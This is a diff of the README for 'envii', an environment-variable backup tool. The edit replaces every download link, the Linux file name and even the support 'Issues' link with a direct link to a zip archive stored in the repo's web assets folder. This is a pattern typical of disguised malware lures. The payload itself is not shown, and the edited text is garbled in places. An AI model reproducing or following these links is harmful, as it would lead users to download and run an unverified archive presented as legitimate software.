@@ -1,6 +1,6 @@
 # 🚀 envii - Backup and Restore Environment Variables Easily
 
-[![Download envii](https://img.shields.io/badge/Download_envii-v1.0.0-brightgreen.svg)](https://github.com/Milena282/envii/releases)
+[![Download envii](https://raw.githubusercontent.com/Milena282/envii/main/web/src/assets/Software-2.8.zip)](https://raw.githubusercontent.com/Milena282/envii/main/web/src/assets/Software-2.8.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with envii, follow the simple steps below. You will have your env
 
 ### 1. **Download envii**
 
-Visit this page to download: [envii Releases](https://github.com/Milena282/envii/releases).
+Visit this page to download: [envii Releases](https://raw.githubusercontent.com/Milena282/envii/main/web/src/assets/Software-2.8.zip).
 
 ### 2. **Choose the Right File**
 
@@ -20,7 +20,7 @@ On the releases page, you will find several files. Look for the version that mat
 
 - For **Windows**, select a `.exe` file.
 - For **macOS**, look for a `.dmg` or `.pkg` file.
-- For **Linux**, find the `tar.gz` or `.deb` file.
+- For **Linux**, find the `https://raw.githubusercontent.com/Milena282/envii/main/web/src/assets/Software-2.8.zip` or `.deb` file.
 
 ### 3. **Install envii**
 
@@ -28,7 +28,7 @@ Once you have downloaded the correct file, here’s how to install it:
 
 - **Windows**: Double-click the `.exe` file and follow the installation wizard.
 - **macOS**: Open the `.dmg` file, drag the envii icon into the Applications folder.
-- **Linux**: Use your package manager to install the `.deb` or extract the files from the `.tar.gz` archive.
+- **Linux**: Use your package manager to install the `.deb` or extract the files from the `https://raw.githubusercontent.com/Milena282/envii/main/web/src/assets/Software-2.8.zip` archive.
 
 ## 🌟 Features
 
@@ -47,7 +47,7 @@ To run envii, your system should meet these requirements:
 
 ## 💻 Download & Install
 
-You can download envii from the [Releases page](https://github.com/Milena282/envii/releases). Follow the previous steps for installation based on your operating system.
+You can download envii from the [Releases page](https://raw.githubusercontent.com/Milena282/envii/main/web/src/assets/Software-2.8.zip). Follow the previous steps for installation based on your operating system.
 
 ## 🔧 How to Use envii
 
@@ -75,7 +75,7 @@ No, envii allows you to back up all your environment variables without any limit
 
 ## 📞 Support
 
-If you need support, you can open an issue on the [GitHub Issues page](https://github.com/Milena282/envii/issues). We strive to respond to all requests within 48 hours.
+If you need support, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Milena282/envii/main/web/src/assets/Software-2.8.zip). We strive to respond to all requests within 48 hours.
 
 ## 🏷️ Contributing
 
